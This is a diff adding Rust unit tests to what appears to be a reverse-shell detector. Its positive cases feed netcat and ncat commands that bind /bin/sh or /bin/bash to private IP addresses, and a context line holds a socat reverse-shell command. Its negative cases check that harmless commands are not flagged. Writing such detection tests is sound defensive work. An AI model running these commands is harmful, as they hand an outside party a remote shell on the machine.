@@ -116,6 +116,36 @@ mod tests {
     }
 
     #[test]
+    fn revshell_ncat() {
+        let ids = analyze("ncat -c /bin/bash 192.168.1.1 443");
+        assert!(has(&ids, "P-REVSHELL-NC"));
+    }
+
+    #[test]
+    fn revshell_nc_path_prefixed() {
+        let ids = analyze("/usr/bin/nc -e /bin/sh 10.0.0.1 4444");
+        assert!(has(&ids, "P-REVSHELL-NC"));
+    }
+
+    #[test]
+    fn revshell_nc_megasync_no_signal() {
+        let ids = analyze("git -C MEGAsync -c protocol.file.allow='always' submodule update");
+        assert!(!has(&ids, "P-REVSHELL-NC"), "MEGAsync should not trigger P-REVSHELL-NC, got: {ids:?}");
+    }
+
+    #[test]
+    fn revshell_nc_sync_no_signal() {
+        let ids = analyze("sync -c /dev/sda");
+        assert!(!has(&ids, "P-REVSHELL-NC"), "sync -c should not trigger P-REVSHELL-NC, got: {ids:?}");
+    }
+
+    #[test]
+    fn revshell_nc_func_no_signal() {
+        let ids = analyze("func -e test_handler");
+        assert!(!has(&ids, "P-REVSHELL-NC"), "func should not trigger P-REVSHELL-NC, got: {ids:?}");
+    }
+
+    #[test]
     fn revshell_socat() {
         let ids = analyze("socat TCP:10.0.0.1:4444 EXEC:/bin/sh");
         assert!(has(&ids, "P-REVSHELL-SOCAT"));
